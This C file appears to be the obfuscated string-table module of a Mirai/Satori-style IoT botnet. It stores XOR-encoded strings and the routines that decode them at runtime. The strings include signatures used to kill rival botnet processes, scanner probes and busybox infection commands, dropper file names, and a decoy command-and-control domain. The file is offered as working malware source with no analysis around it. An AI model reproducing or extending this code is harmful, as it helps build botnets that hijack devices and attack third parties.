#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/util.h"
#include "headers/entry.h"

struct table_struct *start = NULL;
struct table_struct *current = NULL;

struct table_struct *create_list(void)
{
    struct table_struct *ptr = (struct table_struct *)malloc(sizeof(struct table_struct));
    ptr->val = 0;
    ptr->next = NULL;
    start = current = ptr;
}

struct table_struct *add_entry(int val, char *str, uint16_t str_len)
{
    struct table_struct *ptr = (struct table_struct *)malloc(sizeof(struct table_struct));
    ptr->val = val;
    ptr->str = (char *)malloc(str_len);
    util_memcpy(ptr->str, str, str_len);
    ptr->str_len = str_len;
    ptr->next = NULL;
    current->next = ptr;
    current = ptr;
    ptr->locked = -1;
    #ifdef DEBUG
        //printf("[entry/%d] Added %s to the list.\n\x07", val, str);
    #endif
}

void init_entrys(void)
{
    create_list();
    // /bin/busybox
    add_entry(TABLE_HIDE, "\x28\x65\x6E\x69\x28\x65\x72\x74\x7E\x65\x68\x7F\x07", 13);
/*
    // hello friend :)
    add_entry(TABLE_DEPLOY_STRING, "\x6F\x62\x6B\x6B\x68\x27\x61\x75\x6E\x62\x69\x63\x27\x3D\x2E\x07", 16);

*/

    add_entry(TABLE_DEPLOY_STRING, "\x40\x48\x4B\x43\x41\x4E\x54\x4F\x40\x46\x49\x40\x07", 13);
    // /proc/
    add_entry(TABLE_KILLER_PROC, "\x28\x77\x75\x68\x64\x28\x07", 7);
    // /maps
    add_entry(TABLE_KILLER_MAPS, "\x28\x6A\x66\x77\x74\x07", 6);
    // /exe
    add_entry(TABLE_KILLER_EXE, "\x28\x62\x7F\x62\x07", 5);
    // 81c4603681c46036
    add_entry(TABLE_KILLER_MIRAI, "\x3F\x36\x64\x33\x31\x37\x34\x31\x3F\x36\x64\x33\x31\x37\x34\x31\x07", 17);
    // dvrHelper
    add_entry(TABLE_KILLER_MIRAI2, "\x63\x71\x75\x4F\x62\x6B\x77\x62\x75\x07", 10);
    // fuckdvr
    add_entry(TABLE_KILLER_MIRAI3, "\x61\x72\x64\x6C\x63\x71\x75\x07", 8);
    // nexuswashere
    add_entry(TABLE_KILLER_MIRAI4, "\x69\x62\x7F\x72\x74\x70\x66\x74\x6F\x62\x75\x62\x07", 13);
    // bigbotPein
    add_entry(TABLE_KILLER_MIRAI5, "\x65\x6E\x60\x65\x68\x73\x57\x62\x6E\x69\x07", 11);
    // POST /cdn-cgi/
    add_entry(TABLE_KILLER_MIRAI6, "\x57\x48\x54\x53\x27\x28\x64\x63\x69\x2A\x64\x60\x6E\x28\x07", 15);
    // dvrcelper
    add_entry(TABLE_KILLER_MIRAI7, "\x63\x71\x75\x64\x62\x6B\x77\x62\x75\x07", 10);
    // qweasdzxc
    add_entry(TABLE_KILLER_MIRAI8, "\x76\x70\x62\x66\x74\x63\x7D\x7F\x64\x07", 10);
    // abcdefghijklmnop012345
    add_entry(TABLE_KILLER_MIRAI9, "\x66\x65\x64\x63\x62\x61\x60\x6F\x6E\x6D\x6C\x6B\x6A\x69\x68\x77\x37\x36\x35\x34\x33\x32\x07", 23);
    // abcdefghijklmnopqrstuvw012345678
    add_entry(TABLE_KILLER_MIRAI10, "\x66\x65\x64\x63\x62\x61\x60\x6F\x6E\x6D\x6C\x6B\x6A\x69\x68\x77\x76\x75\x74\x73\x72\x71\x70\x37\x36\x35\x34\x33\x32\x31\x30\x3F\x07", 33);
    // 3jp1oakil4e2ndcb5mhfg0
    add_entry(TABLE_KILLER_MIRAI11, "\x34\x6D\x77\x36\x68\x66\x6C\x6E\x6B\x33\x62\x35\x69\x63\x64\x65\x32\x6A\x6F\x61\x60\x37\x07", 23);
    // j57*&jE
    add_entry(TABLE_KILLER_MIRAI12, "\x6D\x32\x30\x2D\x21\x6D\x42\x07", 8);
    // elfLoad
    add_entry(TABLE_KILLER_MIRAI13, "\x62\x6B\x61\x4B\x68\x66\x63\x07", 8);
    // 1gcab4dom35hnp2lei0jkf
    add_entry(TABLE_KILLER_MIRAI14, "\x36\x60\x64\x66\x65\x33\x63\x68\x6A\x34\x32\x6F\x69\x77\x35\x6B\x62\x6E\x37\x6D\x6C\x61\x07", 23);
    // enable
    add_entry(TABLE_SCAN_ENABLE, "\x62\x69\x66\x65\x6B\x62\x07", 7);
    // system
    add_entry(TABLE_SCAN_SYSTEM, "\x74\x7E\x74\x73\x62\x6A\x07", 7);
    // shell
    add_entry(TABLE_SCAN_SHELL, "\x74\x6F\x62\x6B\x6B\x07", 6);
    // sh
    add_entry(TABLE_SCAN_SH, "\x74\x6F\x07", 3);
    // /bin/busybox SATORI
    add_entry(TABLE_SCAN_QUERY, "\x28\x65\x6E\x69\x28\x65\x72\x74\x7E\x65\x68\x7F\x27\x54\x46\x53\x48\x55\x4E\x07", 20);
    // : applet
    add_entry(TABLE_SCAN_BUSYBOX_RESPONSE, "\x3D\x27\x66\x77\x77\x6B\x62\x73\x07", 9);
    // get: applet not found
    add_entry(TABLE_SCAN_WGET_RESPONSE, "\x60\x62\x73\x3D\x27\x66\x77\x77\x6B\x62\x73\x27\x69\x68\x73\x27\x61\x68\x72\x69\x63\x07", 22);
    // ftp: applet not found
    add_entry(TABLE_SCAN_TFTP_RESPONSE, "\x61\x73\x77\x3D\x27\x66\x77\x77\x6B\x62\x73\x27\x69\x68\x73\x27\x61\x68\x72\x69\x63\x07", 22);
    // cho: applet not found
    add_entry(TABLE_SCAN_ECHO_RESPONSE, "\x64\x6F\x68\x3D\x27\x66\x77\x77\x6B\x62\x73\x27\x69\x68\x73\x27\x61\x68\x72\x69\x63\x07", 22);
    // MSNA: applet not found
    add_entry(TABLE_SCAN_MOUNTS_RESPONSE, "\x4A\x54\x49\x46\x3D\x27\x66\x77\x77\x6B\x62\x73\x27\x69\x68\x73\x27\x61\x68\x72\x69\x63\x07", 23);
    // .x
    add_entry(TABLE_SCAN_DROPPER_NAME, "\x29\x7F\x07", 3);
    // .z
    add_entry(TABLE_SCAN_BINARY_NAME, "\x29\x7D\x07", 3);
    // HGYQA: applet
    add_entry(TABLE_SCAN_INFECT_RESPONSE, "\x4F\x40\x5E\x56\x46\x3D\x27\x66\x77\x77\x6B\x62\x73\x07\x07", 14);
    // ECHODONE
    add_entry(TABLE_SCAN_ECHO_FEEDBACK, "\x42\x44\x4F\x48\x43\x48\x49\x42\x07", 9);
    // /bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
    add_entry(TABLE_SCAN_CAT_BUSYBOX, "\x28\x65\x6E\x69\x28\x65\x72\x74\x7E\x65\x68\x7F\x27\x64\x66\x73\x27\x28\x65\x6E\x69\x28\x65\x72\x74\x7E\x65\x68\x7F\x27\x7B\x7B\x27\x70\x6F\x6E\x6B\x62\x27\x75\x62\x66\x63\x27\x6E\x3C\x27\x63\x68\x27\x28\x65\x6E\x69\x28\x65\x72\x74\x7E\x65\x68\x7F\x27\x62\x64\x6F\x68\x27\x3C\x27\x63\x68\x69\x62\x27\x3B\x27\x28\x65\x6E\x69\x28\x65\x72\x74\x7E\x65\x68\x7F\x27\x7B\x7B\x27\x28\x65\x6E\x69\x28\x65\x72\x74\x7E\x65\x68\x7F\x27\x63\x63\x27\x6E\x61\x3A\x28\x65\x6E\x69\x28\x65\x72\x74\x7E\x65\x68\x7F\x27\x65\x74\x3A\x35\x35\x27\x64\x68\x72\x69\x73\x3A\x36\x07", 139);
    // /bin/busybox wget; /bin/busybox tftp; /bin/busybox HGYQA
    add_entry(TABLE_SCAN_DETERMINE_INFECTION, "\x28\x65\x6E\x69\x28\x65\x72\x74\x7E\x65\x68\x7F\x27\x70\x60\x62\x73\x3C\x27\x28\x65\x6E\x69\x28\x65\x72\x74\x7E\x65\x68\x7F\x27\x73\x61\x73\x77\x3C\x27\x28\x65\x6E\x69\x28\x65\x72\x74\x7E\x65\x68\x7F\x27\x4F\x40\x5E\x56\x46\x07", 57);
    // network.bigbotpein.com
    add_entry(TABLE_FAKE_CNC_DOMAIN, "\x69\x62\x73\x70\x68\x75\x6C\x29\x65\x6E\x60\x65\x68\x73\x77\x62\x6E\x69\x29\x64\x68\x6A\x07", 23);
    // /proc/self/exe
    add_entry(TABLE_ATTACH_EXE, "\x28\x77\x75\x68\x64\x28\x74\x62\x6B\x61\x28\x62\x7F\x62\x07", 15);
    //UPX!
    add_entry(TABLE_KILLER_UPX, "\x52\x57\x5F\x26\x07", 5);
}

void unlock_entry(uint8_t id)
{
    struct table_struct *ptr = start;
    int i = 0;
    uint8_t k1 = XOR_KEY & 0xff, k2 = (XOR_KEY >> 8) & 0xff, k3 = (XOR_KEY >> 16) & 0xff, k4 = (XOR_KEY >> 24) & 0xff;
    while(ptr)
    {
        if(ptr->val < 1)
        {
            ptr = ptr->next;
            continue;
        }

        if(id == ptr->val)
        {
            if(!ptr->locked)
            {
                #ifdef DEBUG
                    //printf("[entry/%d] Attempting to double unlock, returning.\n\x07", id);
                #endif
                return;
            }
            for(i = 0; i < ptr->str_len; i++)
            {
                ptr->str[i] ^= k1;
                ptr->str[i] ^= k2;
                ptr->str[i] ^= k3;
                ptr->str[i] ^= k4;
            }
            #ifdef DEBUG
                //printf("[entry/%d] Unlocked %s.\n\x07", ptr->val, ptr->str);
            #endif
            break;
        }
        ptr = ptr->next;
    }
    ptr->locked = FALSE;
}

void lock_entry(uint8_t id)
{
    struct table_struct *ptr = start;
    int i = 0;
    uint8_t k1 = XOR_KEY & 0xff, k2 = (XOR_KEY >> 8) & 0xff, k3 = (XOR_KEY >> 16) & 0xff, k4 = (XOR_KEY >> 24) & 0xff;
    while(ptr)
    {
        if(ptr->val < 1)
        {
            ptr = ptr->next;
            continue;
        }
        if(id == ptr->val)
        {
            if(ptr->locked)
            {
                #ifdef DEBUG
                    //printf("[entry/%d] Attempting to double lock, returning.\n\x07", id);
                #endif
                return;
            }
            for(i = 0; i < ptr->str_len; i++)
            {
                ptr->str[i] ^= k1;
                ptr->str[i] ^= k2;
                ptr->str[i] ^= k3;
                ptr->str[i] ^= k4;

            }
            #ifdef DEBUG
                //printf("[entry/%d] Locked %s.\n\x07", ptr->val, ptr->str);
            #endif
            break;
        }
        ptr = ptr->next;
    }
    ptr->locked = TRUE;
}

char *retrieve_entry(uint8_t id)
{
    struct table_struct *ptr = start;
    while(ptr)
    {
        if(ptr->val < 1)
        {
            ptr = ptr->next;
            continue;
        }
    
        if(id == ptr->val)
        {
            #ifdef DEBUG
                //printf("[entry/%d] Retrieving entry... %s\n\x07", id, ptr->str);
            #endif
            return ptr->str;
        }
        ptr = ptr->next;
    }
}

void *xor(void *str, int str_len)
{
    char *buf = (char *)str;
    char *r = malloc(str_len);
    int i = 0;
    uint8_t k1 = XOR_KEY & 0xff, k2 = (XOR_KEY >> 8) & 0xff, k3 = (XOR_KEY >> 16) & 0xff, k4 = (XOR_KEY >> 24) & 0xff;
    char t;
    for(i = 0; i < str_len; i++)
    {
        t = buf[i] ^ k1;
        t ^= k2;
        t ^= k3;
        t ^= k4;
        r[i] = t;
    }
    return r;   
}
